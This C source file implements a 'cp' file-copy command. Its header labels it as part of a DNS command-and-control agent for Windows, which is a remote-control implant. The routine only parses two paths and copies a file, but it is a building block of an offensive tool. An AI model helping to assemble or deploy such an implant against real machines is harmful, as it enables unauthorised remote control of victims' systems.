/**
 * cp.c - Copy file command for DNS C2 Agent
 */

 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include "../include/cp.h"
 #include "../include/Utils.h"
 
 /**
  * Copy a file
  */
 char* cmd_cp(const char* args) {
     if (args == NULL || *args == '\0') {
         return _strdup("Error: No source or destination specified");
     }
     
     // Parse source and destination
     char* args_copy = _strdup(args);
     if (args_copy == NULL) {
         return _strdup("Error: Memory allocation failed");
     }
     
     char* source = args_copy;
     char* dest = NULL;
     
     // Find the first space to separate source and destination
     char* space = strchr(args_copy, ' ');
     if (space == NULL) {
         free(args_copy);
         return _strdup("Error: No destination specified");
     }
     
     *space = '\0';  // Null-terminate the source
     dest = space + 1;  // Destination starts after the space
     
     // Copy the file using Unicode-aware function
     if (!copy_file(source, dest, TRUE)) {
         char* result = (char*)malloc(256);
         if (result != NULL) {
             sprintf_s(result, 256, "Error: Could not copy file '%s' to '%s'", source, dest);
         }
         free(args_copy);
         return result;
     }
     
     char* result = (char*)malloc(256);
     if (result != NULL) {
         sprintf_s(result, 256, "Successfully copied '%s' to '%s'", source, dest);
     }
     
     free(args_copy);
     return result;
 }
 